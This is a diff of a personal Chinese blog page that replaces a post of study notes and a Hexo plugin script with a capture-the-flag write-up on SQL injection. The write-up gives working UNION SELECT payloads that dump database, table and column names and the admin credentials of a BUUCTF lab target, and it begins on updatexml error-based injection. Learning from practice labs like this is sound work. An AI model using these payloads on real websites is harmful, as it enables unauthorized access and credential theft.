@@ -4,11 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间), ryz">
-    <meta name="description" content="2023-10-23写wp的一些该学的web任意命令执行 文件上传 挂马
-pwnpwn一直很玄学 不是完完全全了解机理 那些什么rsp rdp也不是完全了解 但能把题目做出来
-cryptorsa加密算法 理论可以破解
-这在后面做软件逆向数据">
+    <meta name="keywords" content="Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间), ryz">
+    <meta name="description" content="对打分网站的注入尝试
+
+SQL 前置知识数据库-数据表-字段（column）
+命令切换数据表use database;		
+
+查询字段值USE DATABASE;												#切换数据库
+SELECT * FROM TABLEN">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +23,7 @@ cryptorsa加密算法 理论可以破解
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间) | ryz</title>
+    <title>Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间) | ryz</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -225,12 +228,12 @@ cryptorsa加密算法 理论可以破解
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间)</h1>
+                    <h1 class="description center-align post-title">Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间)</h1>
                 </div>
             </div>
         </div>
@@ -266,7 +269,7 @@ cryptorsa加密算法 理论可以破解
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-10-23
+                    2023-10-24
                 </div>
                 
 
@@ -295,76 +298,105 @@ cryptorsa加密算法 理论可以破解
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="2023-10-23"><a href="#2023-10-23" class="headerlink" title="2023-10-23"></a>2023-10-23</h1><h2 id="写wp的一些该学的"><a href="#写wp的一些该学的" class="headerlink" title="写wp的一些该学的"></a>写wp的一些该学的</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>任意命令执行 文件上传 挂马</p>
-<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>pwn一直很玄学 不是完完全全了解机理 那些什么rsp rdp也不是完全了解 但能把题目做出来</p>
-<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><p>rsa加密算法 理论可以破解</p>
-<p>这在后面做软件逆向数据处理的时候可能用的到</p>
-<p>还有密码对照表 结尾是&#x3D;的那种</p>
-<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>渗透有意思 没环境玩啊</p>
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>那些漏洞 可以尝试自己搭一个环境注入看看 在本地环回接口开个服务？</p>
-<h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><p>那些开了保护的怎么去除</p>
-<h2 id="电脑搭载安卓系统"><a href="#电脑搭载安卓系统" class="headerlink" title="电脑搭载安卓系统"></a>电脑搭载安卓系统</h2><p>wp写完来弄</p>
-<h2 id="博客优化"><a href="#博客优化" class="headerlink" title="博客优化"></a>博客优化</h2><p>还是要写个脚本把他的目录改正啊 每次要修改以前的文章就很麻烦</p>
-<h3 id="目录修正脚本"><a href="#目录修正脚本" class="headerlink" title="目录修正脚本"></a>目录修正脚本</h3><h4 id="typora-hexo设置"><a href="#typora-hexo设置" class="headerlink" title="typora&#x2F;hexo设置"></a>typora&#x2F;hexo设置</h4><ul>
-<li>配置typora文件保存位置为&#x2F;${filename} 即与当前正在编辑的文件名相同的同级文件夹下</li>
-<li>对所有都应用</li>
-<li>优先使用相对路径</li>
-<li>hexo根目录 _config.yml–post_asset_folder false改为true</li>
+                <h1 id="对打分网站的注入尝试"><a href="#对打分网站的注入尝试" class="headerlink" title="对打分网站的注入尝试"></a>对打分网站的注入尝试</h1><img src="/2023/10/24/2023-10-24/image-20231024230231580.png" class="" title="image-20231024230231580">
+
+<h1 id="SQL-前置知识"><a href="#SQL-前置知识" class="headerlink" title="SQL 前置知识"></a>SQL 前置知识</h1><p>数据库-数据表-字段（column）</p>
+<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="切换数据表"><a href="#切换数据表" class="headerlink" title="切换数据表"></a>切换数据表</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> <span class="token keyword">database</span><span class="token punctuation">;</span>		</code></pre>
+
+<h4 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h4><pre class="language-none"><code class="language-none">USE DATABASE;												#切换数据库
+SELECT * FROM TABLENAME WHERE id&#x3D;1;							#查询表中的值</code></pre>
+
+<h4 id="确定字段数"><a href="#确定字段数" class="headerlink" title="确定字段数"></a>确定字段数</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token number">1</span><span class="token comment">#关键字用于对结果集按照一个列或者多个列进行排序。</span></code></pre>
+
+<p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>
+<p>如果大于某个值异常 证明超出字段数</p>
+<h3 id="爆表爆库爆字段"><a href="#爆表爆库爆字段" class="headerlink" title="爆表爆库爆字段"></a>爆表爆库爆字段</h3><p><a name="b"></a></p>
+<h4 id="基本数据表"><a href="#基本数据表" class="headerlink" title="基本数据表"></a>基本数据表</h4><p> mysql5.0以上版本中存在一个重要的系统数据库information_schema，通过此数据库可访问mysql中存在的数据库名、表名、字段名等元数据。<br>       information_schema中有三个表成为了sql注入构造的关键：<br>       1、infromation_schema.columns<br>            table_schema        数据库名<br>            table_name           表名<br>            column_name       列名<br>       2、information_schema.tables<br>            table_schema        数据库名<br>            table_name           表名<br>       3、information_schema.schemata<br>            schema_name       数据库名</p>
+<h4 id="sql拼接函数Group-concat"><a href="#sql拼接函数Group-concat" class="headerlink" title="sql拼接函数Group_concat()"></a>sql拼接函数Group_concat()</h4><p>MySQL中，<code>Group_concat()</code> 函数 将一个分组中的指定元素（列或表达式）的值，拼接成一个字符串返回（用逗号分隔）。</p>
+<p>Group_concat语法</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">Group_concat<span class="token punctuation">(</span> <span class="token punctuation">[</span>要拼接在一起的字段<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">order</span> <span class="token keyword">by</span>…<span class="token punctuation">]</span> <span class="token punctuation">[</span>SEPARATOR separator<span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre>
+
+<p>参数说明</p>
+<pre><code>要拼接在一起的字段
+        要连接的一个或多个列/表达式
+order by…
+        对拼接在一起的内容进行排序
+SEPARATOR
+        拼接符号，默认的是 separator ：逗号,
+</code></pre>
+<h4 id="返回值说明"><a href="#返回值说明" class="headerlink" title="返回值说明"></a>返回值说明</h4><ul>
+<li><p>返回一个字符串：拼接在一起的内容；</p>
+</li>
+<li><p>若结果集没有任何行，此函数将返回null；</p>
+</li>
 </ul>
-<h4 id="开发插件"><a href="#开发插件" class="headerlink" title="开发插件"></a>开发插件</h4><p>创建文件夹hexo-asset-img 初始化npm包</p>
-<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> log <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'hexo-log'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token string-property property">'debug'</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string-property property">'slient'</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<img src="/2023/10/24/2023-10-24/image-20231025114525718.png" class="" title="image-20231025114525718">
 
-<span class="token comment">/**
- * md文件返回 true
- * @param &#123;*&#125; data 
- */</span>
-<span class="token keyword">function</span> <span class="token function">ignore</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token comment">// TODO: 好奇怪，试了一下, md返回true, 但却需要忽略 取反!</span>
-    <span class="token keyword">var</span> source <span class="token operator">=</span> data<span class="token punctuation">.</span>source<span class="token punctuation">;</span>
-    <span class="token keyword">var</span> ext <span class="token operator">=</span> source<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>source<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">'md'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
 
-<span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">var</span> reverseSource <span class="token operator">=</span> data<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">var</span> fileName <span class="token operator">=</span> reverseSource<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> reverseSource<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token comment">// ![example](postname/example.jpg)  -->  &#123;% asset_img example.jpg example %&#125;</span>
-    <span class="token keyword">var</span> regExp <span class="token operator">=</span> <span class="token function">RegExp</span><span class="token punctuation">(</span><span class="token string">"!\[(.*?)\]\("</span> <span class="token operator">+</span> fileName <span class="token operator">+</span> <span class="token string">'/(.+?)\)'</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment">// hexo g</span>
-    data<span class="token punctuation">.</span>content <span class="token operator">=</span> data<span class="token punctuation">.</span>content<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>regExp<span class="token punctuation">,</span> <span class="token string">"&#123;% asset_img $2 $1 %&#125;"</span><span class="token punctuation">,</span><span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<h4 id="LAST"><a href="#LAST" class="headerlink" title="LAST"></a>LAST</h4><pre class="language-sql" data-language="sql"><code class="language-sql">暴库：（information_schema<span class="token punctuation">,</span>ctftraining<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>test<span class="token punctuation">,</span>news）
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata
 
-    <span class="token comment">// log.info(`hexo-asset-img: filename: $&#123;fileName&#125;, title: $&#123;data.title.trim()&#125;`);</span>
-    
-    <span class="token keyword">return</span> data<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
+暴表：（admin<span class="token punctuation">,</span>contents）
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"news"</span>
 
-hexo<span class="token punctuation">.</span>extend<span class="token punctuation">.</span>filter<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'before_post_render'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ignore</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">action</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+暴字段：（id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password）
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"admin"</span>
 
-<p>再json的最后还需加上</p>
-<pre class="language-json" data-language="json"><code class="language-json">dependencies<span class="token operator">:</span><span class="token punctuation">&#123;</span>
-<span class="token property">"hexo-asset-img"</span><span class="token operator">:</span><span class="token string">"1.0.0"</span>
-<span class="token punctuation">&#125;</span></code></pre>
+暴密码：<span class="token punctuation">(</span><span class="token number">983</span>a3f6bc1f3709f9f8997f887ef9803<span class="token punctuation">)</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> admin				<span class="token comment">#0x3a=:</span></code></pre>
 
-<p>好像是配置包依赖</p>
-<p> json的语言 不懂</p>
-<p>还有使用hexo时还是从git-cmd中进</p>
-<p>从cmd中hexo d时推送不成功 可能是环境没有集成</p>
-<p>注意路径生成 源代码可能还需根据实际版本生成的路径进行修改</p>
-<p>最后</p>
-<pre class="language-none"><code class="language-none">npm install hexo-asset-img</code></pre>
 
-<p>不安装无法运行</p>
-<p>tido基本能运作 但好像不能自动发邮件</p>
-<p>文件上传！网盘？</p>
-<h3 id="typora超链接"><a href="#typora超链接" class="headerlink" title="typora超链接"></a>typora超链接</h3><p><a>标签实现页内跳转</p>
-<pre class="language-markdown" data-language="markdown"><code class="language-markdown"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>					添加锚点
-[我要跳了！]（#111）</code></pre>
 
+<h1 id="BUU-SQL-COURSE-1–代入执行查询–union"><a href="#BUU-SQL-COURSE-1–代入执行查询–union" class="headerlink" title="BUU SQL COURSE 1–代入执行查询–union"></a>BUU SQL COURSE 1–代入执行查询–union</h1><p>对sql那些爆表 爆列&#x2F;字段的指令还不是很熟悉 有一道题今天上课看的 可以用那道题来学</p>
+<img src="/2023/10/24/2023-10-24/image-20231025035903526.png" class="" title="POST抓包截图">
+
+<p>burp的抓包还是有点问题</p>
+<p>和新生赛ezsql一样的POST </p>
+<p>jwt-sql注入嘛</p>
+<h2 id="开阔思路"><a href="#开阔思路" class="headerlink" title="开阔思路"></a>开阔思路</h2><p>看了眼wp 说是在新闻热点就存在注入</p>
+<img src="/2023/10/24/2023-10-24/image-20231025040245690.png" class="" title="image-20231025040245690">
+
+<p>看来不能只看url和是否提交值</p>
+<img src="/2023/10/24/2023-10-24/image-20231025104546150.png" class="" title="image-20231025104546150">
+
+<pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">http:&#x2F;&#x2F;a8e93b95-b4c5-4658-9820-121f0fda2fd5.node4.buuoj.cn:81&#x2F;backend&#x2F;content_detail.php?id&#x3D;1 and 1&#x3D;2</code></pre>
+
+<p>and 1&#x3D;2 是判断是否被代入sql查询语句</p>
+<p>order爆出字段数为3</p>
+<img src="/2023/10/24/2023-10-24/image-20231025110437171.png" class="" title="image-20231025110437171">
+
+<p>这种题是指令会被直接代入sql语句执行</p>
+<p>因此直接使用union联合查询</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1
+<span class="token keyword">UNION</span>
+<span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table2<span class="token punctuation">;</span></code></pre>
+
+<p>注意在联合查询时如果id&#x3D;1&#x2F;2&#x2F;3会导致回显被原始内容挤掉 因此采取不存在的id进行查询 这样第一条select语句查询出来的结果为空</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//449ab7a2-1ac2-49fc-89c4-78ca22026945.node4.buuoj.cn:81/backend/content_detail.php?id=4 union select 111,222</span></code></pre>
+
+<img src="/2023/10/24/2023-10-24/image-20231025112413333.png" class="" title="确定前后端查询回显位置">
+
+<p>接下来就是<a href="#b">爆库爆表暴字段</a></p>
+<img src="/2023/10/24/2023-10-24/image-20231025120356492.png" class="" title="image-20231025120356492">
+
+<p>“information_schema,ctftraining,mysql,performance_schema,test,news”</p>
+<img src="/2023/10/24/2023-10-24/image-20231025120540429.png" class="" title="image-20231025120540429">
+
+<p>admin,contents</p>
+<img src="/2023/10/24/2023-10-24/image-20231025120809575.png" class="" title="image-20231025120809575">
+
+<p>id,username,password</p>
+<img src="/2023/10/24/2023-10-24/image-20231025120858963.png" class="" title="image-20231025120858963">
+
+<p>得到账户密码 登陆即可</p>
+<h1 id="RCTF2015-EasySQL–无报错注入–updatexml"><a href="#RCTF2015-EasySQL–无报错注入–updatexml" class="headerlink" title="[RCTF2015]EasySQL–无报错注入–updatexml"></a>[RCTF2015]EasySQL–无报错注入–updatexml</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>UPDATEXML (XML_document, XPath_string, new_value);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
+<p>若第二个参数是非XPATH的参数 就会报错 因此常见注入手段</p>
+<h2 id="wp（x）–注册时的注入在更改密码时报错"><a href="#wp（x）–注册时的注入在更改密码时报错" class="headerlink" title="wp（x）–注册时的注入在更改密码时报错"></a>wp（x）–注册时的注入在更改密码时报错</h2><img src="/2023/10/24/2023-10-24/image-20231025124046559.png" class="" title="image-20231025124046559">
+
+<p>要注册两次才会出现报错</p>
 
                 
             </div>
@@ -391,7 +423,7 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://ybjryz.github.io/2023/10/23/2023-10-23/">http://ybjryz.github.io/2023/10/23/2023-10-23/</a>
+                    <a href="http://ybjryz.github.io/2023/10/24/2023-10-24/">http://ybjryz.github.io/2023/10/24/2023-10-24/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -476,13 +508,13 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/10/24/2023-10-24/">
+                <a href="/2023/10/26/2023-10-26/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间)">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Thu Oct 26 2023 08:00:00 GMT+0800 (中国标准时间)">
                         
-                        <span class="card-title">Tue Oct 24 2023 08:00:00 GMT+0800 (中国标准时间)</span>
+                        <span class="card-title">Thu Oct 26 2023 08:00:00 GMT+0800 (中国标准时间)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -493,45 +525,8 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-24
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-26
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            ryz
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/10/21/2023-10-21/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Sat Oct 21 2023 08:00:00 GMT+0800 (中国标准时间)">
-                        
-                        <span class="card-title">Sat Oct 21 2023 08:00:00 GMT+0800 (中国标准时间)</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-21
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -543,10 +538,47 @@ hexo<span class="token punctuation">.</span>extend<span class="token punctuation
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%AE%89%E5%85%A8-%E5%A4%A7%E6%9D%82%E7%83%A9/">
-                        <span class="chip bg-color">安全-大杂烩</span>
+                    <a href="/tags/WEB-Trojans/">
+                        <span class="chip bg-color">WEB-Trojans</span>
                     </a>
                     
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/10/23/2023-10-23/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间)">
+                        
+                        <span class="card-title">Mon Oct 23 2023 08:00:00 GMT+0800 (中国标准时间)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            ryz
+                            
+                        </span>
+                    </div>
                 </div>
                 
             </div>
